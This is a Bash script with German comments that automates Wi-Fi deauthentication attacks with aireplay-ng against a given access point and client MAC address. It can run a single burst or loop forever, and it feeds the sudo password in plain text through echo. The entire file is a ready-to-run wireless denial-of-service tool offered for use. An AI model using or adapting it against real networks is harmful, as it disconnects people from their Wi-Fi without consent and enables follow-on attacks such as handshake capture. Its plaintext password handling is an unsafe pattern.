#!/bin/bash
set -x

# -----------------------------------------------------------------------------
# 0) Parameter prüfen
# -----------------------------------------------------------------------------
INTERFACE="$1"       # wlan0
AP_MAC="$2"
CLIENT_MAC="$3"
PACKETS="$4"         # 0 → infinite, sonst Anzahl
CHANNEL="$5"
SECRET="$6"

if [[ -z "$INTERFACE" || -z "$AP_MAC" || -z "$CLIENT_MAC" || -z "$CHANNEL" || -z "$SECRET" ]]; then
  echo "Usage: $0 <interface> <ap_mac> <client_mac> <packets:0=infinite> <channel> <secret>"
  exit 1
fi

if ! ip link show "$INTERFACE" &>/dev/null; then
  echo "Interface $INTERFACE nicht gefunden"
  exit 1
fi

echo "[i] Energiesparen aus"
echo "$SECRET" | sudo -S iw dev "$INTERFACE" set power_save off || true

echo "[i] Kanal setzen: $CHANNEL"
echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL"
sleep 1

# -----------------------------------------------------------------------------
# 4) Deauth-Pakete senden
# -----------------------------------------------------------------------------
if [[ "$PACKETS" -eq 0 ]]; then
  echo "[i] Starte infinite Client-Deauth von $CLIENT_MAC ↔ $AP_MAC"
  while true; do
    echo "$SECRET" | sudo -S aireplay-ng -0 1 -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
    sleep 0.1
  done
else
  echo "[i] Sende $PACKETS Deauth-Pakete von $CLIENT_MAC an $AP_MAC"
  echo "$SECRET" | sudo -S aireplay-ng -0 "$PACKETS" -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
fi

exit 0
